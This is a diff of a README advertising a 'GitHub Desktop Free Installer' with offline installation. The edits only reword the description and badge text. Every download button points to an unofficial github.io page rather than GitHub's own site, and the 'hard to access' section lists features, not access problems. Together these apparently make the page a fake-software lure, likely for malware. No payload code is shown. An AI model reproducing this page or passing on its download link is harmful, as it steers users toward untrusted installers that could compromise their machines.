@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 GitHub Desktop Free Installer** — GitHub Desktop is a free, official Git GUI client from GitHub that simplifies common Git workflows. Works without internet access, no account required. Full offline installation.
+**💻 GitHub Desktop Free Installer** — GitHub Desktop is a free, open-source graphical Git client from GitHub for Windows and macOS. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GitHub Desktop](https://img.shields.io/badge/⬇_Install_GitHub%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GitHub Desktop](https://img.shields.io/badge/⬇_Install_GitHub+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About GitHub Desktop
 
-GitHub Desktop is a free, official Git GUI client from GitHub that simplifies common Git workflows. It provides a clean interface for cloning repositories, creating branches, committing changes, and managing pull requests — ideal for developers new to Git.
+GitHub Desktop is a free, open-source graphical Git client from GitHub for Windows and macOS. Simplify your Git workflow with visual branch management, commit history visualization, pull request creation, and merge conflict resolution. GitHub Desktop's clean interface makes Git accessible to developers who prefer visual tools over command-line Git, with deep integration into GitHub's collaboration features.
 
 ---
 
 ## ❌ Problem: GitHub Desktop is hard to access
 
-- **GitHub-Centric** — Best experience with GitHub repositories; GitLab and Bitbucket support limited
-- **Limited Advanced Git** — Missing many advanced Git operations available in command line or competing clients
-- **Windows and macOS Only** — No Linux version available
-- **Oversimplified for Power Users** — Many power users prefer more capable clients
+- **GitHub Focus** — Best suited for GitHub repositories; GitLab/Bitbucket integration less seamless
+- **Advanced Git** — Limited functionality for complex Git workflows like interactive rebase
+- **Platform Coverage** — No Linux version
+- **Power User Features** — Power users may find the simplified interface limiting
 
 ---
 
@@ -81,7 +81,7 @@ GitHub Desktop is a free, official Git GUI client from GitHub that simplifies co
 
 <div align="center">
 
-[![⬇ Install GitHub Desktop](https://img.shields.io/badge/⬇_Install_GitHub%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GitHub Desktop](https://img.shields.io/badge/⬇_Install_GitHub+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ GitHub Desktop is a free, official Git GUI client from GitHub that simplifies co
 
 ---
 
-**GitHub Desktop Free Installer** — GitHub Desktop is a free, official Git GUI client from GitHub that simplifies common Git workflows. Install without internet connection today!
+**GitHub Desktop Free Installer** — GitHub Desktop is a free, open-source graphical Git client from GitHub for Windows and macOS. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install GitHub Desktop](https://img.shields.io/badge/⬇_Install_GitHub%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GitHub Desktop](https://img.shields.io/badge/⬇_Install_GitHub+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
